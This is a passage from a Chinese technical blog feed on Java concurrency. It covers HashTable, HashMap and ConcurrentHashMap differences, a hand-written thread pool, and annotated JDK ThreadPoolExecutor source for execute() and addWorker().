</span>&#123;...&#125;</span><br></pre></td></tr></table></figure><p>三、HashTable基于Dictionary类，而HashMap是基于AbstractMap。</p><p>四、HashTable直接调用hashcode，而HashMap会经过扰动函数，        而且用与位运算代替了取余。因此<strong>HashTable的长度不用是2的整次幂</strong></p><h2 id="与ConcurrentHashMap"><a href="#与ConcurrentHashMap" class="headerlink" title="与ConcurrentHashMap"></a>与ConcurrentHashMap</h2><p>JDK1.7基于分段锁，减少锁粒度。ConcurrentHashMap中的分段锁称为<strong>Segment</strong>，它继承了ReentrantLock，扮演锁的角色，它有着类似于HashMap的结构，即守护着一个HashEntry数组。</p><p>JDK1.8采用Node 数组+链表/红黑树的数据结构来实现，并发控制使用 synchronized 和 CAS 来操作。（JDK1.6以后 对 synchronized锁做了很多优化）t</p><p>get方法是<strong>不加锁的</strong>，因为get方法里的共享变量都定义成volatile类型，保证能被多线程的读，但只能被单线程的写。即使一个线程在读一个线程同时在写，根据happen before原则，对volatile字段的写入先于读操作，所以get总能拿到最新的值。这是用volatile替换锁的经典场景。</p><p>put方法会检查是否有Node节点,如果没有则在循环中使用<strong>CAS</strong>进行添加(链表的头节点),如果检査到内部正在扩容,就helpTransfer协助扩容。否则使用 <strong>synchronized锁住头元素</strong>(链表/红黑二叉树的头元素)添加元素。</p><p>扩容，让每个线程处理自己的区间。通过给每个线程分配桶区间，避免线程间的争用。而如果有新的线程想 put 数据时，也会帮助其扩容。无锁扩容的关键就是通过CAS设置sizeCtl与transferIndex变量，协调多个线程对table数组中的node进行迁移（transferIndex是指向剩余迁移结点的指针）。复制链表时同样会将链表拆成两份。</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>读源码后把自实现的线程池改成了这样</title>
      <link href="/2019/07/01/%E8%87%AA%E5%AE%9E%E7%8E%B0%E7%BA%BF%E7%A8%8B%E6%B1%A0%EF%BC%88%E4%B8%8B%EF%BC%89/"/>
      <url>/2019/07/01/%E8%87%AA%E5%AE%9E%E7%8E%B0%E7%BA%BF%E7%A8%8B%E6%B1%A0%EF%BC%88%E4%B8%8B%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>这个标题我取得一股营销号味道hhh，很早之前学习多线程的时候有自己写过一个简易的线程池，最近读了源码发现自己以前写的代码有很多可以改进的地方。我尤其喜欢用迭代的方式去学习——先实现，然后深入学习，最后改进之前实现的，完成一个迭代。因为这种方式更能看到自己的思路的过程，更明白所以然。好了，闲话不多说。开撸。</p><p>本文分为三个部分：<br>一、如何实现一个简单的线程池？<br>二、jdk线程池源码分析<br>三、改进自实现的线程池</p><h1 id="一、如何实现一个简单的线程池？"><a href="#一、如何实现一个简单的线程池？" class="headerlink" title="一、如何实现一个简单的线程池？"></a>一、如何实现一个简单的线程池？</h1><p>思路分析：线程池其实就是一个生产者消费者模型。</p><p>首先我们需要一个<strong>队列</strong>作为任务容器作为存放任务， 还需要<strong>多个线程</strong>去执行任务，<strong> 消费者线程</strong>不断查询任务队列是否有任务，如果没有该线程等待，如果有任务，取出一个任务，唤醒所有在等待获取队列的线程，释放掉锁。执行任务线程的run方法。</p><p>分析完毕，在开始写代码之前想想具体做法。</p><ul><li>任务容器，用LinkedList实现。</li><li>add方法，用于把任务线程放入任务容器。</li><li>构造函数，一次性启动3个 消费者线程。</li><li>任务：一个有run方法的线程。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ThreadPool</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 线程池大小</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> corePoolSize;</span><br><span class="line">    <span class="comment">// 任务容器</span></span><br><span class="line">    <span class="keyword">private</span> LinkedList&lt;Runnable&gt; workQueue = <span class="keyword">new</span> LinkedList&lt;Runnable&gt;();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">volatile</span> <span class="keyword">boolean</span> RUNNING =<span class="keyword">true</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ThreadPool</span><span class="params">(<span class="keyword">int</span> corePoolSize)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//创建时候初始化线程</span></span><br><span class="line">        <span class="keyword">this</span>.corePoolSize = corePoolSize;</span><br><span class="line">        <span class="keyword">synchronized</span> (workQueue) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; corePoolSize; i++) &#123;</span><br><span class="line">                <span class="keyword">new</span> Worker(<span class="string">"线程"</span> + i).start();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//将任务线程放入线程池</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">(Runnable r)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (workQueue) &#123;</span><br><span class="line">            workQueue.addLast(r);</span><br><span class="line">            <span class="comment">//放入后唤醒所有wait线程</span></span><br><span class="line">            workQueue.notifyAll();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Worker</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">        Runnable task;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Worker</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>(name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="comment">//锁住任务队列，试图取任务，失败则该线程wait</span></span><br><span class="line">            <span class="keyword">while</span> (RUNNING) &#123;</span><br><span class="line">                <span class="keyword">synchronized</span> (workQueue) &#123;</span><br><span class="line">                    <span class="keyword">while</span> (workQueue.isEmpty()) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            workQueue.wait();</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                            e.printStackTrace();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    task = workQueue.removeLast();</span><br><span class="line">                    workQueue.notifyAll();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//取到线程即可释放锁</span></span><br><span class="line">                System.out.println(<span class="keyword">this</span>.getName() + <span class="string">"获得到并且开始执行任务"</span>);</span><br><span class="line">                task.run();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestThreadPool</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        <span class="comment">//线程池大小初始化为3</span></span><br><span class="line">        ThreadPool threadPool=<span class="keyword">new</span> ThreadPool(<span class="number">3</span>);</span><br><span class="line">        <span class="comment">//生成10个任务放入线程池</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">          Runnable task=  <span class="keyword">new</span> Runnable()&#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                    System.out.println(<span class="string">"做任务中。。。"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">          threadPool.add(task);</span><br><span class="line">          Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>启动TestThreadPool，输出</p><p>大功告成。</p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>ConsumerThread类中这段代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">synchronized (tasks) &#123;</span><br><span class="line">  //试图取任务。。。</span><br><span class="line">&#125;</span><br><span class="line">//取到线程即可释放锁</span><br><span class="line">task.run();</span><br></pre></td></tr></table></figure><p>从任务中取任务时候是获取任务队列锁的，但执行任务的时候要先释放锁。如果不释放就去执行，那它执行的过程中其他线程都得等着，<strong>相当于一次只能有一个线程进行任务</strong>。</p><p><em>2019年06月13号注：最近读书《java开发手册》OOP规约第11条：构造方法里禁止加入任何业务逻辑，如果有初始化逻辑，请放在init中。上面代码违背了这个规约。我这里也不改了，做个反例。再接下来的代码中改进</em></p><h1 id="二、jdk线程池源码分析"><a href="#二、jdk线程池源码分析" class="headerlink" title="二、jdk线程池源码分析"></a>二、jdk线程池源码分析</h1><h2 id="线程池的重要方法"><a href="#线程池的重要方法" class="headerlink" title="线程池的重要方法"></a>线程池的重要方法</h2><h3 id="execute-接受任务"><a href="#execute-接受任务" class="headerlink" title="execute()接受任务"></a>execute()接受任务</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">(Runnable command)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (command == <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException();</span><br><span class="line">    <span class="comment">// 表示 “线程池状态” 和 “线程数” 的整数</span></span><br><span class="line">    <span class="keyword">int</span> c = ctl.get();</span><br><span class="line">     <span class="comment">//分为3种情况</span></span><br><span class="line">    <span class="comment">// 情况1：如果当前线程数少于corePoolSize，直接新创建一个 worker 线程，并把当前 command 作为这个线程firstTask</span></span><br><span class="line">    <span class="keyword">if</span> (workerCountOf(c) &lt; corePoolSize) &#123;</span><br><span class="line">        <span class="keyword">if</span> (addWorker(command, <span class="keyword">true</span>))</span><br><span class="line">            <span class="comment">// 添加任务成功</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">          <span class="comment">// 返回 false 代表线程池不允许提交任务</span></span><br><span class="line">        c = ctl.get();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 情况2：要么当前线程数大于等于corePoolSize，要么刚刚 addWorker 失败了</span></span><br><span class="line">    <span class="comment">// 如果线程池处于 RUNNING 状态，把这个任务添加到任务队列 workQueue 中</span></span><br><span class="line">    <span class="keyword">if</span> (isRunning(c) &amp;&amp; workQueue.offer(command)) &#123;</span><br><span class="line">        <span class="keyword">int</span> recheck = ctl.get();</span><br><span class="line">        <span class="comment">//下面这个分支的意图是：担心任务提交到队列中了，但是线程都关闭了</span></span><br><span class="line">        <span class="comment">// 如果线程池已不处于 RUNNING 状态，那么移除已经入队的这个任务，并且执行拒绝策略</span></span><br><span class="line">        <span class="keyword">if</span> (! isRunning(recheck) &amp;&amp; remove(command))</span><br><span class="line">            reject(command);</span><br><span class="line">        <span class="comment">// 如果线程池还是 RUNNING 的，并且线程数为 0，那么开启新的线程</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (workerCountOf(recheck) == <span class="number">0</span>)</span><br><span class="line">            addWorker(<span class="keyword">null</span>, <span class="keyword">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 情况3:如果 workQueue 队列满了，以 maximumPoolSize 为界创建新的 worker，</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!addWorker(command, <span class="keyword">false</span>))</span><br><span class="line">         <span class="comment">// 如果失败，说明当前线程数已经达到 maximumPoolSize，执行拒绝策略</span></span><br><span class="line">        reject(command);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解释一下这行代码，  这个方法会返回一个表示 “线程池状态” 和 “线程数” 的整数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//一开始的状态是ctlOf(RUNNING, 0)</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> AtomicInteger ctl = <span class="keyword">new</span> AtomicInteger(ctlOf(RUNNING, <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//  COUNT_BITS 设置为 29(32-3)，意味着前三位用于存放线程状态，后29位用于存放线程数</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> COUNT_BITS = Integer.SIZE - <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 000 11111111111111111111111111111</span></span><br><span class="line"><span class="comment">// 这里得到的是 29 个 1，也就是说线程池的最大线程数是 2^29-1=536870911</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> CAPACITY   = (<span class="number">1</span> &lt;&lt; COUNT_BITS) - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 运算结果为 111跟29个0：111 00000000000000000000000000000</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> RUNNING    = -<span class="number">1</span> &lt;&lt; COUNT_BITS;</span><br><span class="line"><span class="comment">// 000 00000000000000000000000000000</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> SHUTDOWN   =  <span class="number">0</span> &lt;&lt; COUNT_BITS;</span><br><span class="line"><span class="comment">// 001 00000000000000000000000000000</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> STOP       =  <span class="number">1</span> &lt;&lt; COUNT_BITS;</span><br><span class="line"><span class="comment">// 010 00000000000000000000000000000</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> TIDYING    =  <span class="number">2</span> &lt;&lt; COUNT_BITS;</span><br><span class="line"><span class="comment">// 011 00000000000000000000000000000</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> TERMINATED =  <span class="number">3</span> &lt;&lt; COUNT_BITS;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将整数 c 的低 29 位修改为 0，就得到了线程池的状态</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">runStateOf</span><span class="params">(<span class="keyword">int</span> c)</span>     </span>&#123; <span class="keyword">return</span> c &amp; ~CAPACITY; &#125;</span><br><span class="line"><span class="comment">// 将整数 c 的高 3 为修改为 0，就得到了线程池中的线程数</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">workerCountOf</span><span class="params">(<span class="keyword">int</span> c)</span>  </span>&#123; <span class="keyword">return</span> c &amp; CAPACITY; &#125;</span><br></pre></td></tr></table></figure><p>线程池的状态</p><ul><li>RUNNING：接受新的任务，处理等待队列中的任务</li><li>SHUTDOWN：不接受新的任务提交，但是会继续处理等待队列中的任务</li><li>STOP：不接受新的任务提交，不再处理等待队列中的任务，中断正在执行任务的线程</li><li>TIDYING：所有的任务都销毁了，workCount 为 0。线程池的状态在转换为 TIDYING 状态时，会执行钩子方法 terminated()</li><li>TERMINATED：terminated() 方法结束后，线程池的状态就会变成这个</li></ul><p>重点区分SHUTDOWN和STOP。</p><p>在提一下关闭线程池的方法。</p><p>shutdown()：设置 线程池的状态 为 SHUTDOWN，然后中断所有没有正在执行任务的线程</p><p>shutdownNow()：设置 线程池的状态 为 STOP，然后尝试停止所有的正在执行或暂停任务的线程，并返回等待执行任务的列表<br><strong><em>使用建议：一般调用shutdown（）关闭线程池；若任务不一定要执行完，则调用shutdownNow（）</em></strong></p><h3 id="addWorker-方法：增加工作线程"><a href="#addWorker-方法：增加工作线程" class="headerlink" title="addWorker()方法：增加工作线程"></a>addWorker()方法：增加工作线程</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 参数一：第一个任务。参数二：是否使用核心线程数 corePoolSize 作为创建线程的界限</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">addWorker</span><span class="params">(Runnable firstTask, <span class="keyword">boolean</span> core)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//打破多重循环的关键字retry</span></span><br><span class="line">    retry:</span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="keyword">int</span> c = ctl.get();</span><br><span class="line">        <span class="keyword">int</span> rs = runStateOf(c);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//下面代码的意图：担心创建线程的时候，线程池已经关闭了</span></span><br><span class="line">        <span class="comment">// 如满足以下条件之一，那么不创建新的 worker：</span></span><br><span class="line">        <span class="comment">// 1. 线程池状态大于 SHUTDOWN，其实也就是 STOP, TIDYING, 或 TERMINATED</span></span><br><span class="line">        <span class="comment">// 2. firstTask != null</span></span><br><span class="line">        <span class="comment">// 3. workQueue.isEmpty()</span></span><br><span class="line">        <span class="comment">//  SHUTDOWN 的语义：不允许提交新的任务，但是要把已经进入到 workQueue 的任务执行完，所以在满足条件的基础上，是允许创建新的 Worker 的</span></span><br><span class="line">        <span class="keyword">if</span> (rs &gt;= SHUTDOWN &amp;&amp;</span><br><span class="line">            ! (rs == SHUTDOWN &amp;&amp;</span><br><span class="line">               firstTask == <span class="keyword">null</span> &amp;&amp;</span><br><span class="line">               ! workQueue.isEmpty()))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">            <span class="keyword">int</span> wc = workerCountOf(c);</span><br><span class="line">            <span class="keyword">if</span> (wc &gt;= CAPACITY ||</span><br><span class="line">                wc &gt;= (core ? corePoolSize : maximumPoolSize))</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            <span class="comment">// 如果成功，那么就是所有创建线程前的条件校验都满足了，准备创建线程执行任务了</span></span><br><span class="line">            <span class="comment">// 这里失败的话，说明有其他线程也在尝试往线程池中创建线程</span></span><br><span class="line">            <span class="keyword">if</span> (compareAndIncrementWorkerCount(c))</span><br><span class="line">                <span class="comment">//跳出多重循环</span></span><br><span class="line">                <span class="keyword">break</span> retry;</span><br><span class="line">            <span class="comment">// 由于有并发，重新再读取一下 ctl</span></span><br><span class="line">            c = ctl.get();</span><br><span class="line">            <span class="comment">// 正常如果是 CAS 失败的话，进到下一个里层的for循环就可以了</span></span><br><span class="line">            <span class="comment">// 可是如果是因为其他线程导致线程池的状态发生了变更，比如有其他线程关闭了这个线程池</span></span><br><span class="line">            <span class="comment">// 那么需要回到外层的for循环</span></span><br><span class="line">            <span class="keyword">if</span> (runStateOf(c) != rs)</span><br><span class="line">                <span class="keyword">continue</span> retry;</span><br><span class="line">            <span class="comment">// else CAS failed due to workerCount change; retry inner loop</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 啊终于可以开始创建线程了</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// worker 是否已经启动</span></span><br><span class="line">    <span class="keyword">boolean</span> workerStarted = <span class="keyword">false</span>;</span><br><span class="line">    <span class="comment">// 是否已将这个 worker 添加到 workers 这个 HashSet 中</span></span><br><span class="line">    <span class="keyword">boolean</span> workerAdded = <span class="keyword">false</span>;</span><br><span class="line">    Worker w = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> ReentrantLock mainLock = <span class="keyword">this</span>.mainLock;</span><br><span class="line">        <span class="comment">// 把 firstTask 传给 worker 的构造方法</span></span><br><span class="line">        w = <span class="keyword">new</span> Worker(firstTask);</span><br><span class="line">        <span class="comment">// 取 worker 中的线程对象，Worker的构造方法会调用 ThreadFactory 来创建一个新的线程</span></span><br><span class="line">        <span class="keyword">final</span> Thread t = w.thread;</span><br><span class="line">        <span class="keyword">if</span> (t != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 这个是整个线程池的全局锁，持有这个锁才能让下面的操作“顺理成章”，</span></span><br><span class="line">            <span class="comment">// 因为关闭一个线程池需要这个锁，至少我持有锁的期间，线程池不会被关闭</span></span><br><span class="line">            mainLock.lock();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">int</span> c = ctl.get();</span><br><span class="line">                <span class="keyword">int</span> rs = runStateOf(c);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 小于 SHUTTDOWN 那就是 RUNNING</span></span><br><span class="line">                <span class="comment">// 如果等于 SHUTDOWN，不接受新的任务，但是会继续执行等待队列中的任务</span></span><br><span class="line">                <span class="keyword">if</span> (rs &lt; SHUTDOWN ||</span><br><span class="line">                    (rs == SHUTDOWN &amp;&amp; firstTask == <span class="keyword">null</span>)) &#123;</span><br><span class="line">                    <span class="comment">// worker 里面的 thread 可不能是已经启动的</span></span><br><span class="line">                    <span class="keyword">if</span> (t.isAlive())</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalThreadStateException();</span><br><span class="line">                    <span class="comment">// 加到 workers 这个 HashSet 中</span></span><br><span class="line">                    workers.add(w);</span><br><span class="line">                    <span class="keyword">int</span> s = workers.size();</span><br><span class="line">                    <span class="comment">// largestPoolSize 用于记录 workers 中的个数的最大值</span></span><br><span class="line">                    <span class="comment">// 因为 workers 是不断增加减少的，通过这个值可以知道线程池的大小曾经达到的最大值</span></span><br><span class="line">                    <span class="keyword">if</span> (s &gt; largestPoolSize)</span><br><span class="line">                        largestPoolSize = s;</span><br><span class="line">                    workerAdded = <span class="keyword">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                mainLock.unlock();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 添加成功的话，启动这个线程</span></span><br><span class="line">            <span class="keyword">if</span> (workerAdded) &#123;</span><br><span class="line">                t.start();</span><br><span class="line">                workerStarted = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">// 如果线程没有启动，需要做一些清理工作，如前面 workCount 加了 1，将其减掉</span></span><br><span class="line">        <span class="keyword">if</span> (! workerStarted)</span><br><span class="line">            addWorkerFailed(w);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 返回线程是否启动成功</span></span><br><span class="line">    <span class="keyword">return</span> workerStarted;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="线程池的线程创建时机"><a href="#线程池的线程创建时机" class="headerlink" title="线程池的线程创建时机"></a>线程池的线程创建时机</h3><ul><li>线程池是<strong>懒加载</strong>的，声明的时候并不会创建好线程等待任务，而是当提交第一个任务时才去新建线程；</li><li>当提交一个任务时，如果当前线程数<strong>小于corePoolSize</strong>，就直接创建一个新线程执行任务；</li><li>如果当前线程数<strong>大于corePoolSize</strong>，继续提交的任务被保存到<strong>阻塞队列中</strong>，等待被执行；</li><li>如果阻塞队列满了，并且当前线程数<strong>小于maxPoolSize</strong>，那就创建新的线程执行当前任务；</li><li>如果池里的线程数<strong>大于maxPoolSize</strong>,这时再有任务来，只能调用<strong>拒绝策略</strong>。</li></ul><h3 id="工厂模式"><a href="#工厂模式" class="headerlink" title="工厂模式"></a>工厂模式</h3><p>从线程池的创建讲起，线程池有两种创建方式。</p><p>一是<code>ThreadPoolExecutor threadPool= new ThreadPoolExecutor(10, 15, 60, TimeUnit.SECONDS, new LinkedBlockingQueue&lt;Runnable&gt;());</code></p><p>二是<code>executorService= Executors.newFixedThreadPool(3);</code></p><p>第二钟方式用到了<strong>工厂模式</strong>，点进方法newFixedThreadPool(3)去看是返回一个定义好初始化的参数线程池实例，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 